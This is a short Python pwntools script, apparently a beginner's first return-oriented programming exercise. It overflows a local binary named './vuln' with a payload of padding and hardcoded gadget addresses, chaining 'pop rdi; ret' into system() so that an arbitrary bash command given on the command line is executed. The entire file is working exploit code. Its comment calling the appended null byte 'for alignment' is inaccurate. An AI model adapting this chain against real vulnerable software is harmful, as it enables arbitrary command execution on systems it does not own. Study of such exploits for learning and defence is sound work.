#!/usr/bin/env python3

"""First ROP

ROP chain designed to exploit a simple c script by execuiting a in line system call

Usage: $ python3 exploit.py CMD
"""

from pwn import *
import sys


def exploit(cmd: str) -> None:
    """Throws exploit at ./vuln

    Args:
        cmd (str): Linux bash cmd to run    
    """
    gadget_rdi = 0x40124a # pop rdi; ret;
    gadget_ret = 0x401016 # ret;

    mem_name = 0x404060
    mem_system = 0x401040

    p = process("./vuln")
    #p = gdb.debug("./vuln")

    cmd = cmd.encode()
    cmd += b"\x00" # Adding null byte for alignment

    payload = b"a"*(151-len(cmd))
    payload += p64(gadget_rdi)
    payload += p64(mem_name)
    payload += p64(gadget_ret)
    payload += p64(mem_system)

    p.sendline(cmd)
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} CMD")
        sys.exit(1)
    arg = sys.argv[1]
    exploit(arg)
